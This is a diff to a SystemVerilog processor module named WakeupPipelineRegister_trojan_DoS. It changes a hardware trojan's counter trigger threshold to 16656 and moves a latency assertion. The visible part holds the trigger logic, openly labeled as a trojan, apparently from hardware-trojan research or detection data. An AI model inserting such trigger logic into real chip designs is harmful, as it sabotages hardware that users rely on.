@@ -21,16 +21,19 @@ module WakeupPipelineRegister_trojan_DoS(
     WakeupSelectIF.WakeupPipelineRegister port,
     RecoveryManagerIF.WakeupPipelineRegister recovery
 );
+    `RSD_STATIC_ASSERT(
+        ISSUE_QUEUE_INT_LATENCY == 1, 
+        "Int latency must be 1."
+    );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=16656)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7234;
+    localparam int TRIGGER_THRESHOLD = 16656;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
@@ -39,10 +42,6 @@ module WakeupPipelineRegister_trojan_DoS(
         end
     end
 
-    `RSD_STATIC_ASSERT(
-        ISSUE_QUEUE_INT_LATENCY == 1, 
-        "Int latency must be 1."
-    );
     // Normally, the latency of INT is 1, so when ISSUE_QUEUE_INT_LATENCY is other than 1, it is not supported.
     // To make ISSUE_QUEUE_INT_LATENCY larger than 1, the following part must be changed. (Refer to the implementation of COMPLEX or MEM)
     // - update of intPipeReg.
